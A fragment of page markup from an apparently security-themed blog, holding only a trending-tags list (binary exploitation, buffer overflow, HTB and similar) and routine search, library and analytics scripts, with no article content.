mb-4">Trending Tags</h4><a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/assembly/">Assembly</a> <a class="post-tag" href="/tags/binary-exploitation/">Binary Exploitation</a> <a class="post-tag" href="/tags/buffer-overflow/">Buffer Overflow</a> <a class="post-tag" href="/tags/web/">Web</a> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/vulnserver/">Vulnserver</a> <a class="post-tag" href="/tags/android/">Android</a> <a class="post-tag" href="/tags/kernel/">Kernel</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://h41stur.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
